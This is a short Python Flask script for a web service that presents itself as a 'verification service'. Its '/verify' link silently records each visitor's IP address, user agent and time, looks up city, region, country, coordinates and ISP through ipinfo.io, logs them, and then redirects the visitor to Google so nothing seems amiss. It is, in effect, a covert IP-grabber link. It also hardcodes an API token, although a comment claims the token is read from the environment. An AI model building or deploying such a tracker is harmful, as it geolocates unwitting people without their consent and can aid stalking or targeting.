from flask import Flask, request, redirect
import requests
from datetime import datetime

app = Flask(__name__)

# Read token from environment variable
IPINFO_TOKEN = "faff49844191d5"

@app.route("/")
def home():
    return "Verification service active"

@app.route("/verify")
def track():
    # Get real client IP behind proxy
    forwarded = request.headers.get("X-Forwarded-For")
    ip = forwarded.split(",")[0].strip() if forwarded else request.remote_addr

    user_agent = request.headers.get("User-Agent")
    time = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")

    geo = {}
    try:
        response = requests.get(
            f"https://ipinfo.io/{ip}?token={IPINFO_TOKEN}",
            timeout=5
        )
        geo = response.json()
    except Exception as e:
        print("GeoIP lookup failed:", e)

    log = {
        "time": time,
        "ip": ip,
        "city": geo.get("city"),
        "region": geo.get("region"),
        "country": geo.get("country"),
        "location": geo.get("loc"),   # lat,long (city-level)
        "isp": geo.get("org"),
        "user_agent": user_agent
    }

    # Print to Render runtime logs
    print("TRACK LOG:", log)

    return redirect("https://www.google.com", code=302)

# IMPORTANT:
# Do NOT use app.run()
# Gunicorn will start the app

 